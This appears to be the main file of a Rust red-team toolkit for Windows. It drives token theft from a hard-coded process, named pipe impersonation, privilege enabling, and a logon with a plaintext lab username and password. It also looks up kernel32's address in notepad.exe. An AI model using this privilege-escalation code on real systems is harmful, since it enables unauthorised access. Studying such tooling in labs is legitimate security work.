mod process;
mod token;
use crate::token::{make_token, set_token_privileges, steal_token};
use token::{impersonate_named_pipe, impersonate_token, revert_to_self};
use windows_sys::Win32::System::SystemServices::{
    SE_ASSIGNPRIMARYTOKEN_NAME, SE_DEBUG_NAME, SE_IMPERSONATE_NAME,
};
mod privileges;

fn main() {
    println!("Hello, world!");
    env_logger::init();

    match named_pipe_impersonation() {
        Ok(_) => log::info!("named_pipe_impersonation success!"),
        Err(e) => log::error!("Error: named_pipe_impersonation failed {:?}", e),
    }

    //match token_magic_test() {
    //    Ok(_) => log::info!("token_magic_test success!"),
    //    Err(e) => log::error!("Error: token_magic_test failed {:?}", e),
    //}

    //match process_magic_test() {
    //    Ok(_) => log::info!("process_magic_test success!"),
    //    Err(e) => log::error!("Error: process_magic_test failed {:?}", e),
    //}
}

pub fn token_magic_test() -> Result<(), token::error::Error> {
    set_token_privileges(SE_DEBUG_NAME, true)?;
    set_token_privileges(SE_ASSIGNPRIMARYTOKEN_NAME, true)?;

    let duplicate_token = steal_token(10608)?;
    log::info!("{}", duplicate_token);
    impersonate_token(duplicate_token)?;
    revert_to_self()?;

    let token = make_token("north.sevenkingdoms.local", "robb.stark", "sexywolfy")?;
    log::info!("{}", token);
    impersonate_token(token)?;
    revert_to_self()?;

    Ok(())
}

pub fn process_magic_test() -> Result<(), process::error::Error> {
    let process_id = process::get_process_id_by_name("notepad.exe")?;
    let module_id = process::get_module_address_by_name("kernel32.dll", process_id)?;

    log::info!("process_id: {}", process_id);
    log::info!("Module ID: {:x}", module_id);

    Ok(())
}

pub fn named_pipe_impersonation() -> Result<(), token::error::Error> {
    //set_token_privileges(SE_IMPERSONATE_NAME, true)?;
    impersonate_named_pipe("test")?;
    Ok(())
}
